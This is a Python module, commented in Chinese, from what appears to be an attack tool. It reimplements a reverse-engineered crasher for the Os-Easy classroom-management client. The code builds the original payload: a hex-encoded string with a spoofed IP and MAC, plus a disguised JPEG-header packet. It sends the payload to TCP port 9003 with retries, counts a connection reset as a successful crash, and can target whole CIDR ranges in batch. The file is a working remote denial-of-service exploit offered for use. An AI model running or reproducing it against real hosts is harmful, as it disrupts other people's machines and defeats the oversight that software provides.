# src/modules/remote_crasher.py
# 远程崩溃模块 —— 按 IP 发送崩溃载荷触发远端 Os-Easy 进程终止
#
# 对应原版释放物 oseasycrasher.exe：
#   - 用法：oseasycrasher.exe <ip>
#   - 实现：WSAStartup -> 创建 TCP socket -> connect(<ip>) -> 发送 payload
#   - 反汇编证据：Kill target: %s / [*]Sending Test Payload... / Connection code %d
#
# 本模块用纯 Python/socket 复刻同一套"按 IP 发送载荷触发远端崩溃"流程。
# 默认载荷已按原版还原：TCP 连 9003 → 发送 hex 编码的
#   /<rand>/<rand>/<rand>//24/0/0/<伪造IP>/<伪造MAC>/  + JPEG 头伪装包。
# 也支持用户自定义载荷（留空即用原版）。

import ipaddress
import random
import socket
import time

from src.utils.logger import info, warn, error, debug

# 目标端口（学生端监听的控制通道，实测 ConnectPort=9003 可触发崩溃）
DEFAULT_PORT = 9003
DEFAULT_TIMEOUT = 3.0    # 连接/收发超时

# ── 原版载荷（逆向自 oseasycrasher.exe / 资源 CRASHER） ─────────────────────
# 原版流程（oseasycrasher.exe <ip>）：
#   1) 生成 5 个随机字母数字字符 + 随机伪造源 IP + 随机伪造 MAC
#   2) 组包： /<c1>/<c2>/<c3>//24/0/0/<spoofIP>/<spoofMAC>/
#   3) 对该字符串逐字节做 hex 编码，作为 TCP 第一包发送（端口 9003）
#   4) 再发送第二包：JPEG 头(ffd8ff)伪装的固定 hex 串
# 见反编译 FUN_1400013f0（构造）/ FUN_140001130（socket→connect(9003)→send×2→recv）。
_CHARSET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

# 第二包：原版中的固定 JPEG 头伪装包（已是 hex 文本，原样发送）
JPEG_PAYLOAD_HEX = (
    b"180500002b000000400000000000000008050000ffd8ffe000104a464946"
    b"00010101006000600000ffdb004300140e0f120f0d14121112171614181f"
    b"33211f1c1c1f3f2d2f25334a414e4d49414846525c766452576f5846486"
    b"fffffffff"
)

# 默认载荷哨兵：表示"使用原版动态载荷"（每次发送时随机生成）
ORIGINAL_PAYLOAD = b"__OSEASY_ORIGINAL__"
DEFAULT_PAYLOAD = ORIGINAL_PAYLOAD


def build_original_payload() -> bytes:
    """按 oseasycrasher.exe 的原版算法生成第一包载荷。

    生成：/<c1>/<c2>/<c3>//24/0/0/<伪造IP>/<伪造MAC>/
    再逐字节 hex 编码（小写），返回其 ASCII 字节。

    Returns:
        原版第一包的原始字节（hex 文本）。
    """
    c1, c2, c3 = (random.choice(_CHARSET) for _ in range(3))
    spoof_ip = "%d.%d.%d.%d" % tuple(random.randint(0, 255) for _ in range(4))
    spoof_mac = "%02x:%02x:%02x:%02x:%02x:%02x" % tuple(
        random.randint(0, 255) for _ in range(6)
    )
    raw = f"/{c1}/{c2}/{c3}//24/0/0/{spoof_ip}/{spoof_mac}/"
    return raw.encode("latin1").hex().encode("ascii")


def build_original_packets():
    """返回原版的完整包序列（第一包动态载荷 + 第二包 JPEG 伪装包）。"""
    return [build_original_payload(), JPEG_PAYLOAD_HEX]


def parse_payload(text: str) -> bytes:
    """把用户输入的载荷文本转成原始字节。

    支持解释转义序列：\\r \\n \\t \\\\ \\xNN 等；
    文本为空时返回默认载荷（= 原版动态载荷哨兵 ORIGINAL_PAYLOAD）。

    Args:
        text: 界面输入的载荷字符串。

    Returns:
        对应的原始字节载荷；或原版载荷哨兵。
    """
    text = (text or "").strip()
    if not text:
        return DEFAULT_PAYLOAD
    try:
        # 先按 utf-8 解码成字符，再解释 \r \n \x 等转义，最后转回 latin1 字节
        return text.encode("utf-8").decode("unicode_escape").encode("latin1")
    except Exception:
        return text.encode("utf-8")


def expand_cidr(cidr: str):
    """展开网段字符串为 IP 列表；非合法网段则原样返回。"""
    try:
        net = ipaddress.ip_network(cidr.strip(), strict=False)
        hosts = [str(h) for h in net.hosts()]
        debug(f"网段 {cidr.strip()} 展开为 {len(hosts)} 台主机")
        return hosts
    except ValueError:
        warn(f"网段格式无效，按单 IP 处理: {cidr.strip()}")
        return [cidr.strip()]


# 结果状态标记（供 GUI 判定弹窗类型）
RESULT_OK = "[OK]"        # 崩溃已触发 / 载荷已送达
RESULT_FAIL = "[FAIL]"    # 明确失败（拒连/超时/无法解析等）


def crash(ip: str, port: int = DEFAULT_PORT, payload: bytes = DEFAULT_PAYLOAD,
          timeout: float = DEFAULT_TIMEOUT, retries: int = 2,
          retry_delay: float = 3.0) -> str:
    """按 IP 对远程主机发送崩溃载荷（智能判定 + 自动重试）。

    判定规则（依据 docs/CRASH_FUNCTION_REVERSE_REPORT.md 逆向结论）：
      - ConnectionRefusedError(10061) → 9003 未监听（服务未拉起/空窗期）
        → 自动等待 retry_delay 秒重试，覆盖“第一次拒连、第二次成功”的拉起窗口
      - ConnectionResetError(10054)  → 连接建立后被强制关闭
        → 即服务端解析线程崩溃、socket 被 RST → ★ 崩溃已触发（成功）
      - socket.timeout               → 载荷已送达，等待响应超时（可能已生效）
      - 发送成功无异常               → 载荷已送达，等待观察

    Args:
        ip:          目标主机 IP。
        port:        目标端口。
        payload:     要发送的原始字节载荷。
        timeout:     连接/收发超时。
        retries:     10061 未监听时的重试次数（默认 2，即最多尝试 3 次）。
        retry_delay: 重试间隔秒数，覆盖 9003 服务拉起窗口（默认 3s）。

    Returns:
        结果描述字符串。
    """
    ip = (ip or "").strip()
    if not ip:
        warn("远程崩溃：未提供目标 IP，已跳过")
        return f"{RESULT_FAIL} 未提供目标 IP"
    try:
        port = int(port or DEFAULT_PORT)
    except (TypeError, ValueError):
        error(f"远程崩溃：端口无效: {port}")
        return f"{RESULT_FAIL} 端口无效: {port}"

    # 解析载荷：原版哨兵/空 → 使用原版双包；否则用自定义单包
    if not payload or payload == ORIGINAL_PAYLOAD:
        payloads = build_original_packets()
        payload_desc = f"原版载荷({len(payloads)}包: 动态hex + JPEG伪装)"
    else:
        payloads = [payload]
        payload_desc = f"自定义载荷({len(payload)}字节)"

    attempts = 1 + max(0, int(retries))
    for attempt in range(1, attempts + 1):
        debug(f"远程崩溃 尝试[{attempt}/{attempts}] → 目标 {ip}:{port}，"
              f"{payload_desc}，超时 {timeout}s")
        t0 = time.perf_counter()
        try:
            sock = socket.create_connection((ip, port), timeout=timeout)
            conn_ms = (time.perf_counter() - t0) * 1000
            debug(f"TCP 连接建立成功 {ip}:{port}（耗时 {conn_ms:.0f}ms）")
        except ConnectionRefusedError:
            el = (time.perf_counter() - t0) * 1000
            if attempt < attempts:
                warn(f"尝试[{attempt}/{attempts}] {ip}:{port} 未监听(10061，耗时 {el:.0f}ms)，"
                     f"{retry_delay}s 后重试（9003 服务可能正在拉起）")
                time.sleep(retry_delay)
                continue
            warn(f"{ip}:{port} 重试 {retries} 次后 9003 仍拒连，服务未拉起")
            return f"{RESULT_FAIL} 连接 {ip}:{port} 被拒(10061) ×{attempts}，9003 未监听（服务未拉起），已放弃"
        except socket.timeout:
            el = (time.perf_counter() - t0) * 1000
            warn(f"连接 {ip}:{port} 超时（{timeout}s）（耗时 {el:.0f}ms）")
            return f"{RESULT_FAIL} 连接 {ip}:{port} 超时，发送失败"
        except socket.gaierror as exc:
            error(f"无法解析主机 {ip}: {exc}")
            return f"{RESULT_FAIL} 无法解析主机 {ip}"
        except OSError as exc:
            el = (time.perf_counter() - t0) * 1000
            warn(f"连接 {ip}:{port} 失败: {exc}（耗时 {el:.0f}ms）")
            return f"{RESULT_FAIL} 连接 {ip}:{port} 失败: {exc}"

        # 连接成功：按原版顺序发送载荷包并判定结果
        try:
            for idx, pkt in enumerate(payloads, 1):
                sock.sendall(pkt)
                debug(f"已发送第 {idx}/{len(payloads)} 包 {len(pkt)} 字节到 {ip}:{port}")
            try:
                resp = sock.recv(64)
                if resp:
                    extra = f"，收到响应 {len(resp)} 字节: {resp!r}"
                    msg = f"{RESULT_OK} 崩溃指令已发送到 {ip}:{port}{extra}"
                else:
                    extra = "，连接被对方正常关闭(EOF)"
                    msg = f"{RESULT_OK} 崩溃指令已发送到 {ip}:{port}{extra}"
                info(msg)
                return msg
            except ConnectionResetError:
                # 10054：连接建立后被强制关闭 = 服务端解析线程崩溃 → 成功
                msg = f"{RESULT_OK} {ip}:{port} ✅ 载荷已送达，对方连接被强制关闭（崩溃已触发）"
                info(msg)
                return msg
            except socket.timeout:
                msg = f"{RESULT_OK} {ip}:{port} 载荷已送达，等待响应超时（可能已生效，观察 10s）"
                info(msg)
                return msg
        finally:
            sock.close()
            debug(f"已关闭与 {ip}:{port} 的连接")

    return f"连接 {ip}:{port} 失败"  # 理论不可达


def crash_targets(ips, port: int = DEFAULT_PORT,
                  payload: bytes = DEFAULT_PAYLOAD) -> str:
    """对多个 IP 批量发送崩溃载荷。

    Args:
        ips:  IP 列表。

    Returns:
        带状态标记的结果摘要字符串（供 GUI 判定弹窗类型）。
    """
    ips = list(ips)
    debug(f"远程崩溃 批量开始 → 共 {len(ips)} 台，端口 {port}")
    t0 = time.perf_counter()
    ok, fail = 0, 0
    details = []
    for i, ip in enumerate(ips, 1):
        debug(f"--- 批量进度 [{i}/{len(ips)}] {ip} ---")
        r = crash(ip, port, payload)
        # 成功标志：带 [OK] 前缀
        if r.startswith(RESULT_OK):
            ok += 1
        else:
            fail += 1
        details.append(f"{ip}: {r}")
    el = time.perf_counter() - t0
    info(f"远程崩溃批量完成：成功 {ok} 台，失败 {fail} 台，总耗时 {el:.2f}s")
    # 只把失败项写日志，避免刷屏
    for d in details:
        if RESULT_FAIL in d or "超时" in d:
            warn(d)
    if ok > 0 and fail == 0:
        return f"{RESULT_OK} 批量远程崩溃：成功 {ok} 台，失败 0 台（总耗时 {el:.1f}s）"
    if ok == 0 and fail > 0:
        return f"{RESULT_FAIL} 批量远程崩溃：成功 0 台，失败 {fail} 台（总耗时 {el:.1f}s）"
    return f"{RESULT_FAIL} 批量远程崩溃：成功 {ok} 台，失败 {fail} 台（总耗时 {el:.1f}s，部分失败）"
